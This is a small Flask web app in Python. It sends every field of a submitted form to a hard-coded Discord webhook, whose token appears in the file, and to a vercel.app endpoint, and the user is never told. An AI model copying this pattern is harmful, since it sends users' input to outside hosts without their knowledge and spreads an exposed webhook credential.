from flask import Flask, request, render_template
import json
import requests
import asyncio
app = Flask(__name__)

@app.route("/", methods=['GET', 'POST'])
def hello_world():
    async def send_info():
        global a
        a = request.form
        print(a['name'])
        for item, value in a.items():
            for link in ['https://discord.com/api/webhooks/1038012726305366076/sr1YKbFZsi2t20YiuPubRFDFk3uHVyqeQ_zmIGiMxcZBKQc2pY5PDsN0LHufeI7dHUnM', "https://display-html.vercel.app/"]:
                if "discord" in link:
                    
                    requests.post(link, data={"content": f"{item}:{value}"})
                else:
                    requests.post(link, data={item:value})
    
    if request.method == 'POST':
        asyncio.run(send_info())
        return render_template('base.html', a=a)
    
    
    else:
        return render_template('base.html', a=None)

#changed lots of links MUST CHANGE BACK WHEN COMMITING